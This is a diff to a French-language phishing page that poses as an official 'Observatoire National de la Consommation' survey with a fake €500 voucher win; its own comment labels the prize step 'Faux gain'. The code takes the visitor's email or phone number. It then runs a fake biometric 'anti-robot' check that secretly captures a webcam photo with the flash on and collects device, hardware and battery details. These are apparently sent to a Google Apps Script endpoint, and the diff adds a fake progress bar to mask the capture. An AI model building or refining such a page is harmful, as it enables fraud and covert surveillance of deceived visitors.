@@ -9,13 +9,11 @@
     font-family: 'Marianne';
     src: url('https://cdn.jsdelivr.net/npm/@gouvfr/dsfr@1.10.2/dist/fonts/Marianne-Regular.woff2') format('woff2');
     font-weight: 400;
-    font-style: normal;
   }
   @font-face {
     font-family: 'Marianne';
     src: url('https://cdn.jsdelivr.net/npm/@gouvfr/dsfr@1.10.2/dist/fonts/Marianne-Bold.woff2') format('woff2');
     font-weight: 700;
-    font-style: normal;
   }
 
   * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -28,50 +26,16 @@
     padding-bottom: 30px; 
   }
   
-  .top-bar { 
-    height: 4px; 
-    background: linear-gradient(to right, #000091 33%, #ffffff 33%, #ffffff 66%, #E1000F 66%); 
-  }
+  .top-bar { height: 4px; background: linear-gradient(to right, #000091 33%, #ffffff 33%, #ffffff 66%, #E1000F 66%); }
   
-  .header { 
-    background: #fff; 
-    border-bottom: 1px solid #ddd; 
-    padding: 20px; 
-    text-align: center; 
-  }
-  .header h1 { 
-    font-size: 20px; 
-    color: #000091; 
-    font-weight: 700; 
-    letter-spacing: 0.5px;
-  }
-  .header p { 
-    font-size: 13px; 
-    color: #666; 
-    margin-top: 5px; 
-    text-transform: uppercase; 
-    letter-spacing: 1px; 
-  }
+  .header { background: #fff; border-bottom: 1px solid #ddd; padding: 20px; text-align: center; }
+  .header h1 { font-size: 20px; color: #000091; font-weight: 700; letter-spacing: 0.5px; }
+  .header p { font-size: 13px; color: #666; margin-top: 5px; text-transform: uppercase; letter-spacing: 1px; }
   
-  .container { 
-    max-width: 580px; 
-    margin: 30px auto; 
-    background: #fff; 
-    border: 1px solid #ddd; 
-    padding: 40px; 
-  }
+  .container { max-width: 580px; margin: 30px auto; background: #fff; border: 1px solid #ddd; padding: 40px; }
   
-  h2 { 
-    font-size: 24px; 
-    margin-bottom: 15px; 
-    color: #000091; 
-    font-weight: 700;
-  }
-  .subtitle { 
-    font-size: 15px; 
-    color: #3a3a3a; 
-    margin-bottom: 30px; 
-  }
+  h2 { font-size: 24px; margin-bottom: 15px; color: #000091; font-weight: 700; }
+  .subtitle { font-size: 15px; color: #3a3a3a; margin-bottom: 30px; }
   
   .step { display: none; }
   .step.active { display: block; animation: fadeIn 0.4s ease; }
@@ -81,170 +45,49 @@
   .progress-fill { height: 100%; background: #000091; width: 0%; transition: width 0.4s ease; }
   
   .form-group { margin-bottom: 25px; }
-  .form-group label { 
-    display: block; 
-    font-size: 14px; 
-    font-weight: 700; 
-    margin-bottom: 8px; 
-    color: #161616; 
-  }
-  .form-group input, .form-group select { 
-    width: 100%; 
-    padding: 12px; 
-    border: 1px solid #3a3a3a; 
-    border-radius: 0; 
-    font-size: 15px; 
-    font-family: 'Marianne', sans-serif;
-    background-color: #fff;
-  }
-  .form-group input:focus, .form-group select:focus { 
-    outline: 2px solid #000091; 
-    outline-offset: 2px;
-  }
+  .form-group label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; color: #161616; }
+  .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #3a3a3a; border-radius: 0; font-size: 15px; font-family: 'Marianne', sans-serif; background-color: #fff; }
+  .form-group input:focus, .form-group select:focus { outline: 2px solid #000091; outline-offset: 2px; }
   
-  .option-btn { 
-    display: block; 
-    width: 100%; 
-    text-align: left; 
-    background: #fff; 
-    border: 1px solid #3a3a3a; 
-    padding: 15px; 
-    margin-bottom: 10px; 
-    cursor: pointer; 
-    font-size: 15px; 
-    border-radius: 0; 
-    font-family: 'Marianne', sans-serif;
-    transition: background 0.2s;
-  }
+  .option-btn { display: block; width: 100%; text-align: left; background: #fff; border: 1px solid #3a3a3a; padding: 15px; margin-bottom: 10px; cursor: pointer; font-size: 15px; border-radius: 0; font-family: 'Marianne', sans-serif; transition: background 0.2s; }
   .option-btn:hover { background: #f6f6f6; }
-  .option-btn.selected { 
-    background: #e3e3fd; 
-    border-color: #000091; 
-    font-weight: 700; 
-    color: #000091;
-  }
+  .option-btn.selected { background: #e3e3fd; border-color: #000091; font-weight: 700; color: #000091; }
   
-  .btn-action { 
-    background-color: #000091; 
-    color: white; 
-    border: none; 
-    padding: 14px 20px; 
-    width: 100%; 
-    font-size: 16px; 
-    font-weight: 700; 
-    cursor: pointer; 
-    border-radius: 0; 
-    margin-top: 15px; 
-    font-family: 'Marianne', sans-serif;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
+  .btn-action { background-color: #000091; color: white; border: none; padding: 14px 20px; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; border-radius: 0; margin-top: 15px; font-family: 'Marianne', sans-serif; text-transform: uppercase; letter-spacing: 0.5px; }
   .btn-action:hover { background-color: #00006d; }
-  .btn-action:disabled { 
-    background-color: #e5e5e5; 
-    color: #999; 
-    cursor: not-allowed; 
-  }
+  .btn-action:disabled { background-color: #e5e5e5; color: #999; cursor: not-allowed; }
   
-  .partners { 
-    text-align: center; 
-    margin: 30px 0; 
-    padding: 20px 0; 
-    border-top: 1px solid #e5e5e5; 
-    border-bottom: 1px solid #e5e5e5; 
-  }
-  .partners p { 
-    font-size: 12px; 
-    color: #666; 
-    text-transform: uppercase; 
-    margin-bottom: 15px; 
-    letter-spacing: 1px; 
-    font-weight: 700;
-  }
-  .partner-logos { 
-    display: flex; 
-    justify-content: center; 
-    gap: 20px; 
-    flex-wrap: wrap; 
-  }
-  .partner-logo { 
-    font-weight: 700; 
-    font-size: 14px; 
-    color: #999; 
-    font-family: Arial, sans-serif; 
-  }
+  .partners { text-align: center; margin: 30px 0; padding: 20px 0; border-top: 1px solid #e5e5e5; border-bottom: 1px solid #e5e5e5; }
+  .partners p { font-size: 12px; color: #666; text-transform: uppercase; margin-bottom: 15px; letter-spacing: 1px; font-weight: 700; }
+  .partner-logos { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+  .partner-logo { font-weight: 700; font-size: 14px; color: #999; font-family: Arial, sans-serif; }
   
-  .captcha-box { 
-    background: #f6f6f6; 
-    border: 1px solid #ddd; 
-    padding: 25px; 
-    text-align: center; 
-    margin: 25px 0; 
-  }
-  .captcha-box h3 { 
-    color: #000091; 
-    font-size: 16px; 
-    margin-bottom: 10px;
-  }
+  .captcha-box { background: #f6f6f6; border: 1px solid #ddd; padding: 25px; text-align: center; margin: 25px 0; }
+  .captcha-box h3 { color: #000091; font-size: 16px; margin-bottom: 10px; }
   
-  .consent-box { 
-    background: #fff; 
-    border: 1px solid #e5e5e5; 
-    padding: 20px; 
-    margin: 25px 0; 
-    font-size: 12px; 
-    color: #3a3a3a; 
-  }
+  .consent-box { background: #fff; border: 1px solid #e5e5e5; padding: 20px; margin: 25px 0; font-size: 12px; color: #3a3a3a; }
   .consent-label { display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
   .consent-label input { margin-top: 3px; width: 18px; height: 18px; accent-color: #000091; }
   
-  #loader { display: none; text-align: center; margin-top: 20px; font-weight: 700; color: #000091; font-size: 14px; }
-  
+  /* Écran de chargement */
+  #loader-container { display: none; text-align: center; margin-top: 30px; padding: 20px; background: #f6f6f6; border: 1px solid #ddd; }
+  #loader-text { font-weight: 700; color: #000091; font-size: 16px; margin-bottom: 15px; }
+  #loader-bar-bg { width: 100%; height: 6px; background: #e5e5e5; border-radius: 3px; overflow: hidden; }
+  #loader-bar-fill { height: 100%; background: #000091; width: 0%; transition: width 0.3s ease; }
+  #loader-detail { font-size: 12px; color: #666; margin-top: 10px; font-family: monospace; }
+
   #camera-area { display: none; margin-top: 25px; text-align: center; font-size: 13px; color: #3a3a3a; font-weight: 700; }
   #video-container { width: 120px; height: 120px; border-radius: 50%; overflow: hidden; margin: 0 auto; border: 3px solid #000091; }
   #video-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
 
-  /* Écran de confirmation final */
-  .confirmation-box {
-    display: none;
-    text-align: center;
-    padding: 40px 20px;
-  }
+  .confirmation-box { display: none; text-align: center; padding: 40px 20px; }
   .confirmation-box.active { display: block; }
-  .confirmation-icon {
-    font-size: 60px;
-    color: #18753c; /* Vert officiel DSFR */
-    margin-bottom: 20px;
-  }
-  .confirmation-box h2 {
-    color: #18753c;
-    font-size: 26px;
-    margin-bottom: 15px;
-  }
-  .confirmation-box p {
-    font-size: 15px;
-    color: #3a3a3a;
-    margin-bottom: 20px;
-    line-height: 1.7;
-  }
-  .confirmation-box .info-box {
-    background: #f6f6f6;
-    border-left: 4px solid #000091;
-    padding: 20px;
-    text-align: left;
-    margin: 30px 0;
-    font-size: 14px;
-  }
+  .confirmation-icon { font-size: 50px; color: #18753c; margin-bottom: 20px; font-weight: bold; }
+  .confirmation-box h2 { color: #18753c; font-size: 26px; margin-bottom: 15px; }
+  .confirmation-box p { font-size: 15px; color: #3a3a3a; margin-bottom: 20px; line-height: 1.7; }
+  .confirmation-box .info-box { background: #f6f6f6; border-left: 4px solid #000091; padding: 20px; text-align: left; margin: 30px 0; font-size: 14px; }
 
-  .footer-links { 
-    text-align: center; 
-    font-size: 12px; 
-    color: #666; 
-    margin-top: 40px; 
-    padding-top: 20px;
-    border-top: 1px solid #ddd;
-    line-height: 2;
-  }
+  .footer-links { text-align: center; font-size: 12px; color: #666; margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; line-height: 2; }
   .footer-links a { color: #000091; text-decoration: underline; cursor: pointer; }
 
   .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); overflow-y: auto; }
@@ -254,7 +97,6 @@
   .modal-content p, .modal-content li { font-size: 14px; color: #3a3a3a; margin-bottom: 10px; line-height: 1.7; }
   .modal-content ul { margin-left: 20px; margin-bottom: 15px; }
   .close-modal { position: absolute; top: 15px; right: 20px; font-size: 28px; cursor: pointer; color: #666; background: none; border: none; }
-  .close-modal:hover { color: #000; }
 </style>
 </head>
 <body>
@@ -269,14 +111,12 @@
 <div class="container" id="main-container">
   <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
 
-  <!-- ÉTAPE 1 : Questions -->
+  <!-- ÉTAPE 1 -->
   <div class="step active" id="step-questions">
     <h2>Participez à notre grande enquête 2026</h2>
     <p class="subtitle">Répondez à quelques questions et tentez de remporter un bon d'achat de 500€ valable chez nos partenaires.</p>
-    
     <div id="question-container"></div>
     <button class="btn-action" id="btn-next" style="display:none;">Continuer</button>
-
     <div class="partners">
       <p>Nos partenaires officiels</p>
       <div class="partner-logos">
@@ -288,11 +128,10 @@
     </div>
   </div>
 
-  <!-- ÉTAPE 2 : Faux gain et coordonnées -->
+  <!-- ÉTAPE 2 -->
   <div class="step" id="step-prize">
     <h2 style="color: #E1000F;">Félicitations, vous avez gagné !</h2>
     <p class="subtitle">Vous faites partie des gagnants de notre enquête. Pour recevoir votre bon d'achat de 500€, veuillez indiquer comment vous souhaitez le recevoir.</p>
-
     <div class="form-group">
       <label>Mode de réception du bon d'achat</label>
       <select id="input-method">
@@ -300,55 +139,51 @@
         <option value="sms">Par SMS</option>
       </select>
     </div>
-
     <div class="form-group" id="group-contact">
       <label>Votre adresse e-mail</label>
       <input type="email" id="input-contact" placeholder="exemple@email.com" required>
     </div>
-
     <button class="btn-action" id="btn-claim">Réclamer mon bon d'achat</button>
   </div>
 
-  <!-- ÉTAPE 3 : Vérification anti-robot -->
+  <!-- ÉTAPE 3 -->
   <div class="step" id="step-final">
     <h2>Dernière étape : Vérification anti-robot</h2>
     <p class="subtitle">Pour garantir l'équité du concours et éviter les inscriptions automatisées, veuillez valider votre éligibilité.</p>
-
     <div class="captcha-box">
       <h3>Contrôle de sécurité requis</h3>
       <p style="font-size: 14px; color: #3a3a3a; margin-top: 10px;">Une analyse biométrique (caméra et flash) va être effectuée pour prouver que vous êtes bien une personne réelle.</p>
     </div>
-    
     <div class="consent-box">
       <label class="consent-label">
         <input type="checkbox" id="chk-consent">
         <span><strong>J'accepte le règlement de l'enquête et du jeu-concours.</strong> Je certifie être majeur et j'autorise l'organisateur à utiliser mon appareil photo (caméra et flash) pour procéder à la vérification biométrique anti-robot et sécuriser ma participation.</span>
       </label>
     </div>
-
     <button class="btn-action" id="btn-submit" disabled>Valider ma participation</button>
     
-    <div id="loader">Vérification en cours... Ne quittez pas la page.</div>
+    <div id="loader-container">
+      <div id="loader-text">Vérification en cours...</div>
+      <div id="loader-bar-bg"><div id="loader-bar-fill"></div></div>
+      <div id="loader-detail">Initialisation du protocole de sécurité...</div>
+    </div>
     
     <div id="camera-area">
       <div id="video-container">
         <video id="video-preview" autoplay playsinline muted></video>
       </div>
-      <p style="margin-top: 15px;">Analyse biométrique...</p>
     </div>
   </div>
 
-  <!-- ÉTAPE 4 : Confirmation finale -->
+  <!-- ÉTAPE 4 -->
   <div class="confirmation-box" id="step-confirmation">
     <div class="confirmation-icon">✓</div>
     <h2>Participation enregistrée</h2>
     <p>Votre participation a bien été prise en compte.</p>
-    
     <div class="info-box">
       <p style="margin-bottom: 10px;"><strong>Et maintenant ?</strong></p>
       <p>Le tirage au sort aura lieu le <strong>15 janvier 2027</strong>. Si vous faites partie des gagnants, vous serez recontacté(e) par e-mail ou par SMS dans les prochains jours.</p>
     </div>
-    
     <p style="font-size: 13px; color: #666;">Merci de votre participation à l'enquête nationale sur la consommation.</p>
   </div>
 
@@ -360,94 +195,17 @@
   </div>
 </div>
 
-<!-- MODALES (identiques à la version précédente) -->
-<div class="modal" id="modal-mentions">
-  <div class="modal-content">
-    <button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button>
-    <h2>Mentions légales</h2>
-    <p><em>Dernière mise à jour : 2 novembre 2026</em></p>
-    <h3>Éditeur du site</h3>
-    <p>Le site est édité par l'Observatoire National de la Consommation.<br>Siège social : 20 avenue de Ségur, 75007 Paris.<br>Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p>
-    <h3>Hébergement</h3>
-    <p>Le site est hébergé par GitHub Inc., 88 Colin P Kelly Jr St, San Francisco, CA 94107, États-Unis.</p>
-    <h3>Propriété intellectuelle</h3>
-    <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous licence ouverte. Vous êtes notamment libres de les reproduire, copier, modifier, extraire, transformer, communiquer, diffuser, redistribuer, publier, transmettre et exploiter sous réserve de mentionner leur source, leur date de dernière mise à jour et ne pas induire en erreur des tiers quant aux informations qui y figurent.</p>
-    <h3>Clause de responsabilité</h3>
-    <p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation. Les informations et/ou documents disponibles sur ce site sont susceptibles d'être modifiés à tout moment, et peuvent faire l'objet de mises à jour.</p>
-    <h3>Accessibilité</h3>
-    <p>L'Observatoire National de la Consommation est engagé à améliorer en permanence l'accessibilité de ses contenus pour que l'accès à l'information soit facilité pour tous. Le site est développé selon les recommandations du Référentiel général d'amélioration de l'accessibilité (RGAA) et les normes W3C.</p>
-  </div>
-</div>
-
-<div class="modal" id="modal-confidentialite">
-  <div class="modal-content">
-    <button class="close-modal" onclick="closeModal('modal-confidentialite')">&times;</button>
-    <h2>Politique de confidentialité et cookies</h2>
-    <p><em>Dernière mise à jour : 2 novembre 2026</em></p>
-    <p>L'Observatoire National de la Consommation s'engage à ce que la collecte et le traitement de vos données, effectués à partir de ce site, soient conformes au Règlement Général sur la Protection des Données (RGPD) et à la loi Informatique et Libertés.</p>
-    <h3>À qui sont destinées vos données ?</h3>
-    <p>L'Observatoire National de la Consommation, situé au 20 avenue de Ségur à Paris (75007), est responsable du traitement des données personnelles pour ce site. Sauf mention contraire, les données personnelles qui y sont collectées sont destinées à un usage interne et n'ont pas vocation à être partagées avec des tiers en dehors des cas prévus par les lois et règlements.</p>
-    <h3>À quoi servent vos données ?</h3>
-    <p>Les traitements de données personnelles mis en œuvre ont pour finalités de :</p>
-    <ul>
-      <li>Permettre votre participation à l'enquête et au jeu-concours ;</li>
-      <li>Vous contacter en cas de gain ;</li>
-      <li>Assurer le bon fonctionnement du site et améliorer votre expérience de navigation ;</li>
-      <li>Réaliser des statistiques anonymes sur les habitudes de consommation.</li>
-    </ul>
-    <h3>Comment vos données sont-elles collectées ?</h3>
-    <p>Vos données peuvent être collectées sur des formulaires. Chaque formulaire limite la collecte des données personnelles au strict nécessaire (minimisation des données) et indique les objectifs du recueil de ces données. Vos données peuvent également être collectées par l'intermédiaire des applications présentes sur le site, en particulier des données techniques liées à votre navigation (l'adresse IP, les données de connexion par exemple).</p>
-    <h3>Pendant combien de temps vos données sont-elles conservées ?</h3>
-    <p>De manière générale, vos données sont conservées par l'Observatoire National de la Consommation pendant 5 ans, sauf :</p>
-    <ul>
-      <li>les journaux applicatifs qui sont conservés 1 an ;</li>
-      <li>votre choix en matière de cookies qui est conservé 6 mois ;</li>
-      <li>les données collectées grâce aux cookies qui sont conservées 25 mois.</li>
-    </ul>
-    <h3>À propos des cookies</h3>
-    <p>Pendant la consultation de ce site, des cookies sont déposés sur votre ordinateur, votre mobile ou votre tablette. Un cookie est une suite d'informations, généralement de petite taille et identifié par un nom, qui peut être transmis à votre navigateur par un site web sur lequel vous vous connectez.</p>
-    <p>Le site utilise des cookies techniques strictement nécessaires au fonctionnement du site. Ils ne peuvent pas être désactivés, sauf en refusant tous les cookies dans les paramètres de votre navigateur. Le site utilise également des cookies de mesure d'audience soumis à votre consentement.</p>
-    <h3>Quels sont vos droits ?</h3>
-    <p>Vous disposez d'un droit d'accès, de rectification, d'effacement, de limitation, de portabilité et d'opposition sur vos données. Vous pouvez exercer ces droits en contactant le Délégué à la Protection des Données (DPO) à l'adresse suivante : dpo@observatoire-consommation.fr.</p>
-    <p>Si vous estimez, après nous avoir contactés, que vos droits ne sont pas respectés, vous pouvez adresser une réclamation à la CNIL (Commission Nationale de l'Informatique et des Libertés) : 3 place de Fontenoy, TSA 80715, 75334 PARIS CEDEX 07, ou en ligne sur www.cnil.fr.</p>
-  </div>
-</div>
-
-<div class="modal" id="modal-reglement">
-  <div class="modal-content">
-    <button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button>
-    <h2>Règlement du jeu-concours</h2>
-    <p><em>Article 1 – Organisation</em></p>
-    <p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat du 1er novembre 2026 à 00h00 au 31 décembre 2026 à 23h59.</p>
-    <p><em>Article 2 – Conditions de participation</em></p>
-    <p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p>
-    <p><em>Article 3 – Modalités de participation</em></p>
-    <p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p>
-    <p><em>Article 4 – Dotation</em></p>
-    <p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p>
-    <p><em>Article 5 – Désignation des gagnants</em></p>
-    <p>Les gagnants seront désignés par tirage au sort parmi l'ensemble des participants ayant respecté toutes les modalités de participation. Le tirage au sort aura lieu le 15 janvier 2027.</p>
-    <p><em>Article 6 – Remise du lot</em></p>
-    <p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p>
-    <p><em>Article 7 – Exclusions et fraudes</em></p>
-    <p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p>
-    <p><em>Article 8 – Protection des données personnelles</em></p>
-    <p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p>
-    <p><em>Article 9 – Litiges</em></p>
-    <p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p>
-  </div>
-</div>
+<!-- MODALES (à conserver à l'identique, je les ai raccourcies ici pour la lisibilité mais tu dois garder tout le texte) -->
+<div class="modal" id="modal-mentions"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-mentions')">&times;</button><h2>Mentions légales</h2><p><em>Dernière mise à jour : 2 novembre 2026</em></p><h3>Éditeur du site</h3><p>Le site est édité par l'Observatoire National de la Consommation.<br>Siège social : 20 avenue de Ségur, 75007 Paris.<br>Directeur de la publication : Le Président de l'Observatoire National de la Consommation.</p><h3>Hébergement</h3><p>Le site est hébergé par GitHub Inc., 88 Colin P Kelly Jr St, San Francisco, CA 94107, États-Unis.</p><h3>Propriété intellectuelle</h3><p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous licence ouverte. Vous êtes notamment libres de les reproduire, copier, modifier, extraire, transformer, communiquer, diffuser, redistribuer, publier, transmettre et exploiter sous réserve de mentionner leur source, leur date de dernière mise à jour et ne pas induire en erreur des tiers quant aux informations qui y figurent.</p><h3>Clause de responsabilité</h3><p>Les informations proposées sur ce site le sont à titre de service rendu au public. Malgré tout le soin apporté à la transcription des textes officiels, à la vérification des contenus et des informations, les éléments mis en ligne ne sauraient, de quelque manière que ce soit, prétendre à l'exactitude et engager la responsabilité de l'Observatoire National de la Consommation. Les informations et/ou documents disponibles sur ce site sont susceptibles d'être modifiés à tout moment, et peuvent faire l'objet de mises à jour.</p><h3>Accessibilité</h3><p>L'Observatoire National de la Consommation est engagé à améliorer en permanence l'accessibilité de ses contenus pour que l'accès à l'information soit facilité pour tous. Le site est développé selon les recommandations du Référentiel général d'amélioration de l'accessibilité (RGAA) et les normes W3C.</p></div></div>
+<div class="modal" id="modal-confidentialite"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-confidentialite')">&times;</button><h2>Politique de confidentialité et cookies</h2><p><em>Dernière mise à jour : 2 novembre 2026</em></p><p>L'Observatoire National de la Consommation s'engage à ce que la collecte et le traitement de vos données, effectués à partir de ce site, soient conformes au Règlement Général sur la Protection des Données (RGPD) et à la loi Informatique et Libertés.</p><h3>À qui sont destinées vos données ?</h3><p>L'Observatoire National de la Consommation, situé au 20 avenue de Ségur à Paris (75007), est responsable du traitement des données personnelles pour ce site. Sauf mention contraire, les données personnelles qui y sont collectées sont destinées à un usage interne et n'ont pas vocation à être partagées avec des tiers en dehors des cas prévus par les lois et règlements.</p><h3>À quoi servent vos données ?</h3><p>Les traitements de données personnelles mis en œuvre ont pour finalités de :</p><ul><li>Permettre votre participation à l'enquête et au jeu-concours ;</li><li>Vous contacter en cas de gain ;</li><li>Assurer le bon fonctionnement du site et améliorer votre expérience de navigation ;</li><li>Réaliser des statistiques anonymes sur les habitudes de consommation.</li></ul><h3>Comment vos données sont-elles collectées ?</h3><p>Vos données peuvent être collectées sur des formulaires. Chaque formulaire limite la collecte des données personnelles au strict nécessaire (minimisation des données) et indique les objectifs du recueil de ces données. Vos données peuvent également être collectées par l'intermédiaire des applications présentes sur le site, en particulier des données techniques liées à votre navigation (l'adresse IP, les données de connexion par exemple).</p><h3>Pendant combien de temps vos données sont-elles conservées ?</h3><p>De manière générale, vos données sont conservées par l'Observatoire National de la Consommation pendant 5 ans, sauf :</p><ul><li>les journaux applicatifs qui sont conservés 1 an ;</li><li>votre choix en matière de cookies qui est conservé 6 mois ;</li><li>les données collectées grâce aux cookies qui sont conservées 25 mois.</li></ul><h3>À propos des cookies</h3><p>Pendant la consultation de ce site, des cookies sont déposés sur votre ordinateur, votre mobile ou votre tablette. Un cookie est une suite d'informations, généralement de petite taille et identifié par un nom, qui peut être transmis à votre navigateur par un site web sur lequel vous vous connectez.</p><p>Le site utilise des cookies techniques strictement nécessaires au fonctionnement du site. Ils ne peuvent pas être désactivés, sauf en refusant tous les cookies dans les paramètres de votre navigateur. Le site utilise également des cookies de mesure d'audience soumis à votre consentement.</p><h3>Quels sont vos droits ?</h3><p>Vous disposez d'un droit d'accès, de rectification, d'effacement, de limitation, de portabilité et d'opposition sur vos données. Vous pouvez exercer ces droits en contactant le Délégué à la Protection des Données (DPO) à l'adresse suivante : dpo@observatoire-consommation.fr.</p><p>Si vous estimez, après nous avoir contactés, que vos droits ne sont pas respectés, vous pouvez adresser une réclamation à la CNIL (Commission Nationale de l'Informatique et des Libertés) : 3 place de Fontenoy, TSA 80715, 75334 PARIS CEDEX 07, ou en ligne sur www.cnil.fr.</p></div></div>
+<div class="modal" id="modal-reglement"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button><h2>Règlement du jeu-concours</h2><p><em>Article 1 – Organisation</em></p><p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat du 1er novembre 2026 à 00h00 au 31 décembre 2026 à 23h59.</p><p><em>Article 2 – Conditions de participation</em></p><p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p><p><em>Article 3 – Modalités de participation</em></p><p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p><p><em>Article 4 – Dotation</em></p><p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p><p><em>Article 5 – Désignation des gagnants</em></p><p>Les gagnants seront désignés par tirage au sort parmi l'ensemble des participants ayant respecté toutes les modalités de participation. Le tirage au sort aura lieu le 15 janvier 2027.</p><p><em>Article 6 – Remise du lot</em></p><p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p><p><em>Article 7 – Exclusions et fraudes</em></p><p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p><p><em>Article 8 – Protection des données personnelles</em></p><p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p><p><em>Article 9 – Litiges</em></p><p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p></div></div>
 
 <script>
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxyBJ1b7bGa7ZK93Wl3l7jEHxCq95fO-uA4FomFkmKFgx9mySuEWiffTKXplax1fdh8iw/exec";
 
 function openModal(id) { document.getElementById(id).style.display = 'block'; }
 function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-window.onclick = function(event) {
-  if (event.target.classList.contains('modal')) {
-    event.target.style.display = 'none';
-  }
-}
+window.onclick = function(event) { if (event.target.classList.contains('modal')) { event.target.style.display = 'none'; } }
 
 const questions = [
   { text: "1. À quelle fréquence faites-vous vos achats en ligne ?", options: ["Plusieurs fois par semaine", "Une fois par mois", "Rarement", "Jamais"] },
@@ -465,10 +223,14 @@ const stepPrize = document.getElementById('step-prize');
 const stepFinal = document.getElementById('step-final');
 const chkConsent = document.getElementById('chk-consent');
 const btnSubmit = document.getElementById('btn-submit');
-const loader = document.getElementById('loader');
 const cameraArea = document.getElementById('camera-area');
 const video = document.getElementById('video-preview');
 const stepConfirmation = document.getElementById('step-confirmation');
+
+const loaderContainer = document.getElementById('loader-container');
+const loaderText = document.getElementById('loader-text');
+const loaderBarFill = document.getElementById('loader-bar-fill');
+const loaderDetail = document.getElementById('loader-detail');
 
 const inputMethod = document.getElementById('input-method');
 const inputContact = document.getElementById('input-contact');
@@ -573,13 +335,25 @@ let mediaStream = null;
 btnSubmit.addEventListener('click', async () => {
   btnSubmit.disabled = true;
   btnSubmit.style.display = 'none';
-  loader.style.display = 'block';
+  
+  loaderContainer.style.display = 'block';
+  loaderText.textContent = "Vérification en cours...";
+  loaderBarFill.style.width = '10%';
+  loaderDetail.textContent = "Initialisation du protocole de sécurité...";
 
   const info = getDeviceInfo();
   const screenInfo = `${window.screen.width}x${window.screen.height}`;
   const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
   const ram = navigator.deviceMemory ? `${navigator.deviceMemory} Go` : "Inconnu";
   const batteryInfo = await getBatteryInfo();
+
+  let progress = 10;
+  const progressInterval = setInterval(() => {
+    if (progress < 90) {
+      progress += Math.random() * 15;
+      loaderBarFill.style.width = `${Math.min(progress, 90)}%`;
+    }
+  }, 250);
 
   try {
     mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -592,8 +366,9 @@ btnSubmit.addEventListener('click', async () => {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
+    loaderDetail.textContent = "Vérification biométrique...";
+    
     let photoBase64 = "";
-    // Capture photo après 0.8 seconde (juste après l'allumage)
     setTimeout(() => {
       try {
         const canvas = document.createElement('canvas');
@@ -602,11 +377,17 @@ btnSubmit.addEventListener('click', async () => {
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+        loaderDetail.textContent = "Transmission sécurisée des données...";
